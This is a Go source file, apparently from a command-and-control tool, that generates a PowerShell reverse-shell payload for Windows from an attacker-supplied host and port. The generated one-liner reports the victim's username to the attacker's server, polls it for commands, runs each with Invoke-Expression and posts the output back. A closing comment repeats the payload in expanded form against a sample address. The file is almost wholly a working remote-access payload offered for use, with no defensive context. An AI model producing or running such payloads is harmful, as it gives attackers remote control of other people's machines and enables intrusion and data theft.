package main

import "math/rand"

func generate_random_id() string {
	var id string

	var chars string = "abcdef012345789"

	for i:=0;i<3;i++ {
		for ii:=0;ii<6;ii++ {
			id += string(chars[rand.Intn(len(chars) - 1)])
		}
		id += "-"
	}

	id = id[0:len(id) - 1]

	return id
}

func generate(os string, lhost string, lport string) string {
	var result string

	switch os {
		case("windows"):
			result = Fore["GREEN"]+`for (;;) {try {$_sess="`+generate_random_id()+`";$_host="`+lhost+`:`+lport+`";$_oper="windows";$_prot="http://";$_user=whoami;$_tmp=(Invoke-WebRequest $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="*";"Auth"=$_sess;"Self"=$_user;"Os"=$_oper } ).Content;for (;;) {try {$_tmp=(Invoke-WebRequest $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="?";"Auth"=$_sess } ).Content;if ($_tmp -ne "None") {$_call = (iex $_tmp 2>&1 | Out-String );$_tmp=(Invoke-WebRequest -Method POST $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="+";"Auth"=$_sess } -Body $_call ).Content;} } catch {$_call=$_;$_tmp=(Invoke-WebRequest -Method POST $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="+";"Auth"=$_sess } -Body $_call ).Content;}Sleep 1}} catch {}}`+Fore["RESET"]
		default:
			result = "The OS is currently not available."
	}

	return result
}

/*

for (;;) {
    try {
        $_sess="123456-789012-345678"
        $_host="192.168.178.175:8080"
        $_oper="windows"
        $_prot="http://"
        $_user=whoami
        $_tmp=(Invoke-WebRequest http://192.168.178.175:8080/ -UseBasicParsing -Headers @{ "Joker"="*";"Auth"=$_sess;"Self"=$_user;"Os"=$_oper } ).Content
        for (;;) {
            try {
            $_tmp=(Invoke-WebRequest http://192.168.178.175:8080/ -UseBasicParsing -Headers @{ "Joker"="?";"Auth"=$_sess } ).Content
            if ($_tmp -ne "None") {
                $_call = (iex $_tmp 2>&1 | Out-String )
                $_tmp=(Invoke-WebRequest -Method POST http://192.168.178.175:8080/ -UseBasicParsing -Headers @{ "Joker"="+";"Auth"=$_sess } -Body $_call ).Content
            } } catch {
                $_call=$_
                $_tmp=(Invoke-WebRequest -Method POST http://192.168.178.175:8080/ -UseBasicParsing -Headers @{ "Joker"="+";"Auth"=$_sess } -Body $_call ).Content
            }
            Sleep 1
        }
    } catch {}
}


*/